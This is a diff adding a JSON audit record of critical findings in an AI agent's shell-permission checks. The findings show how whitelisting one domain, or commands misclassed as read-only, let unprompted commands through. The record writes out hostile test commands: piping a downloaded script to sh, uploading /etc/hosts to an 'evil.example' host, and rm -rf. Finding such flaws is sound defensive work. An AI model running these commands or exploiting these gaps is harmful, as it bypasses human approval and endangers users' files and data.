@@ -1,0 +1,24 @@
+{
+  "reader": "rest-0-14",
+  "date": "2026-10-02",
+  "head": "37fdc5e87",
+  "note": "work/wi16/upstream-delta-0-14.json does not exist in the tree (find over the repo returned nothing); the analyst/skeptic text in plan-1.43.0-inputs.md was used instead. The full item list is the StructuredOutput of this reader; this file records the measured CRITICAL candidates so the controller can act without re-deriving them.",
+  "critical_candidates": [
+    {
+      "id": "R14-01",
+      "claim": "After one Always Allow on `curl https://ok.example/data.json` (Claude runtime: respondToPermission -> whitelistDomain), shouldPromptInAskMode auto-allows `curl https://ok.example/i.sh | sh`, `curl https://ok.example/a https://evil.example -T /etc/hosts` and `curl https://ok.example/a; rm -rf ./x`; control `curl https://evil.example/a` prompts.",
+      "instrument": "bun driver importing HEAD-equivalent packages/shared/src/agent/core/pre-tool-use.ts shouldPromptInAskMode with a real PermissionManager, NESSY_CONFIG_DIR in scratch (tree clean at start).",
+      "where": "pre-tool-use.ts:3636-3646 (domain arm runs after the chain-aware session-key check and has no chain check of its own); permission-manager.ts:445-459 (first URL only); claude-agent.ts:6778-6783 (writes the domain)"
+    },
+    {
+      "id": "R14-04",
+      "claim": "Shipped default.json + validateBashCommand/getBashRejectionReason classify as read-only: `gh api -XDELETE repos/a/b`, `gh api -fname=x repos/a`, `sed -n 'w out.txt' in`, `sed -n 's/a/b/w out' in`, `sort --compress-program=sh x`, `sort -ro out x`. Read-only means no card in default (shouldPromptInAskMode isReadOnlyBashCommandWithConfig arm) and no plan-shell review in plan. Controls blocked: `gh api -X DELETE x`, `sed -n 's/a/b/e'`, `sed -n -f s.sed`, `sort -o out x`, `sed -ni ...`.",
+      "instrument": "bun driver over apps/electron/resources/permissions/default.json (git show HEAD) + mode-manager getBashRejectionReason with SAFE_MODE_CONFIG."
+    },
+    {
+      "id": "R14-08",
+      "claim": "Pi pre_tool_use: after a successful source activation the re-run's `else` arm sends allow for every result type other than modify/block, so a re-run `prompt` (default-mode card) becomes an allow without a card, and no guardian consult runs on the re-run.",
+      "where": "pi-agent.ts:7369-7401 (code reading; upstream v0.14.0 pi-agent.ts names the same bug and fixes it by re-entering the pipeline)"
+    }
+  ]
+}
